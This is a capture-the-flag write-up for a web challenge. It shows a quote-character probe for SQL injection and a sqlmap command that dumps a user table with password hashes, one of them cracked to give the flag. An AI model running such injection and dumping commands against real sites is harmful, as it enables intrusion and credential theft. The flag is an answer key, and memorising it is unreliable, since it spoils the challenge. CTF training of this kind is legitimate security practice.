# Monkey Gallery Challenge 

## Description
The Monkey Gallery is a passion project created by an eccentric zoologist... but rumors say it’s more than just a harmless tribute to primates.

Sources suggest that the gallery's backend was slapped together in a hurry, and not all monkeys were meant to be seen. Some are part of a hidden experiment, and their records are locked deep within a private database table.

**Your mission:**<br>
Can you uncover the truth buried in the database?

Start by investigating how the site loads a monkey’s profile. Try accessing different monkeys using the URL path: <br>
**http://200.200.200.40:3000/monkey/{id}**

You might notice something odd when you experiment with certain `id` values — and maybe, just maybe, you can speak directly to the database…

🎯 Objective: 
Find the password for a mysterious user named "flaghunter" hiding deep within the database.

Good luck. Monkeys are watching. 

**Submission Format**: <br>
ICO2025{password}

## Category
Web Exploitation

## Points
50

## **Solution**:
The first thing I did was running this command. It made me realise that I didn't even have to visit the website in a browser... There was SQL injection in the URL.
```bash
curl "http://200.200.200.40:3000/monkey/1'"
```
Since it threw an error. The solution was then to
```bash
sqlmap -u "http://localhost:3390/monkey/1*" --dump --batch
```
Whice gave me this:
``` 
Table: monkey_users_999
[7 entries]
+----+------------------------+---------------------------------+---------------------------------+-------------------------------------------+--------------+-----------+------------+
| id | email                  | avatar                          | address                         | password                                  | username     | last_name | first_name |
+----+------------------------+---------------------------------+---------------------------------+-------------------------------------------+--------------+-----------+------------+
| 1  | ethan.h@example.com    | https://example.com/monkey2.jpg | 42 Phantom Lane, Darknet        | 196cc593c7d89eda4116228ef61bc667          | CyberPhantom | Hawke     | Ethan      |
| 2  | alex.rogue@example.com | https://example.com/monkey3.jpg | 88 Cyberspace Blvd, Hacker City | 729d0923965c623fccdd11b98af0691f          | ByteBandit   | Rogue     | Alex       |
| 3  | lena.q@example.com     | https://example.com/monkey4.jpg | 7 Uncertainty St, Quantum Realm | b3e13b88de438d41985a0912cbbb1cb4          | QuantumFuzz  | Quark     | Lena       |
| 4  | felix.g@example.com    | https://example.com/monkey5.jpg | 404 Not Found Ave, Internet     | be199d24412bf97492ac59f8d9099969          | GlitchWizard | Glitchman | Felix      |
| 5  | ivy.cipher@example.com | https://example.com/monkey6.jpg | 1337 Hidden Path, Deep Web      | 8651a7e3033f338adc6b90aaacaa3586          | ShadowCipher | Cipher    | Ivy        |
| 6  | noah.m@example.com     | https://example.com/monkey7.jpg | 77 Virtual St, Cyberworld       | 60694de09f51c3f50662cedee408a8bd          | NeonNexus    | Metaverse | Noah       |
| 7  | wolf@example.com       | https://example.com/monkey1.jpg | 123 Admin Street, Root City     | e4c8ee13cd1c42ba878f499317880c3b (**ananab**) | FlagHunter   | Wolf      | John       |
+----+------------------------+---------------------------------+---------------------------------+-------------------------------------------+--------------+-----------+------------+
```
Apparently, it cracked the user hash itself. So the flag was:
**ICO2025{ananab}**